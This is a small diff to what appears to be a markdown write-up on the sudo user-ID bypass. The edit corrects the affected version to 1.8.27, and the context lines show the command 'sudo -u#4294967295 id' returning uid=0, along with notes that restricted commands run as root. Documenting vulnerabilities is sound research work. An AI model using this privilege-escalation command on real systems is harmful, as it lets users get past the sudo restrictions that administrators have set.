@@ -191,7 +191,7 @@ john@blak-off:/home/blak$ sudo -u#4294967295 id
 uid=0(root) gid=1001(john) groups=1001(john)
 john@blak-off:/home/blak$ 
 ```
-## It Happens the same with sudo 1.27 version. Bash didnt work but 'id','vi', etc work ..!!
+## It Happens the same with sudo 1.8.27 version. Bash didnt work but 'id','vi', etc work ..!!
 
 ```
 According to my test i'm able to execute all commands which is restricted to run as root accept bash.
